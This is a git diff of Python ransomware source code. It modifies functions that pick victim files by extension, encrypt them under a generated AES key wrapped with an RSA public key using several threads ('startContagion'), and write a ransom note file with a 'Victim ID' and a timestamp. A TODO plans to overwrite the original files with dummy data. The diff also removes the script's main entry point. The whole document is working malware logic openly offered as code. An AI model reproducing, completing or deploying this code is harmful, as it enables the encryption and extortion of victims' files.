@@ -9,7 +9,15 @@ from hasp.AESCipher import AESCipher
 from hasp.RSACipher import RSACipher
 from aptal import APTAl
 
-def isInTargetFiles(_extention):
+
+"""
+TODO:1
+    re-write file with dummy data :: OK
+    del <object>
+    garbage collection
+"""
+
+def isInTargetFiles(extention):
     """
         Binary Search to find extentions in the target files
     """
@@ -19,25 +27,24 @@ def isInTargetFiles(_extention):
     while left <= right:
         mid = (left + right)// 2
         current = Utils.file_extentions[mid]
-        if current  > _extention:
+        if current  > extention:
             right = mid - 1
-        elif current  < _extention:
+        elif current  < extention:
             left = mid + 1
         else:
             return True
     return False
 
-def isValidFile(file_path):
+def isValidFile(file_name):
     """
         Determining whether the file is valid or not
     """
-    if file_path != Utils.what_is_my_name:
-        _extention = file_path.split(".")[-1].lower()
-        if len(_extention) == 1 or isInTargetFiles(_extention):
-            return True
+    _extention = file_name.split(".")[-1].lower()
+    if len(_extention) == 1 or isInTargetFiles(_extention):
+        return True
     return False
 
-def startContagion(path):
+def startContagion(path,rsapublickey):
     """
         What happening in here:
             - Creating RSA ciphers
@@ -46,7 +53,7 @@ def startContagion(path):
             - Encrypt the files with multithread option
     """
 
-    rsa_cipher = RSACipher(Utils.rsa_public_key)
+    rsa_cipher = RSACipher(rsapublickey)
 
     goodbye_files = Queue()
     aeskey = AESCipher.generate_key(Utils.aes_IV_key_length)
@@ -84,27 +91,12 @@ def startContagion(path):
 
     print("FILE ENCRYPTION HAS JUST DONE")
 
-def keyStoreCreate():
+def keyStoreCreate(version,ransomid):
 
     with open(Utils.aesIV_file_store_path,"w") as key_storing_file:
-        key_storing_file.write(Utils.who_we_are + Utils.version)
-        key_storing_file.write(Utils.what_is_my_purpose)
-        key_storing_file.write("Your Victim ID : "+Utils.what_is_my_id)
-        key_storing_file.write("When did ransomware work : "+Utils.when_did_i_work)
+        key_storing_file.write(Utils.who_we_are + version + "\n")
+        key_storing_file.write(Utils.what_is_my_purpose + "\n")
+        key_storing_file.write("Your Victim ID : "+ransomid + "\n")
+        key_storing_file.write("When did ransomware work : " + Utils.when_did_i_work + "\n")
         # and so on
     print("STORE FILE CREATED")
-
-def main():
-    """
-    TODO:1
-        re-write file with dummy data :: OK
-        del <object>
-        garbage collection
-    """
-    keyStoreCreate()
-    found_files = startContagion(Utils.root_directory)
-
-    
-
-if __name__ == "__main__":
-    main()
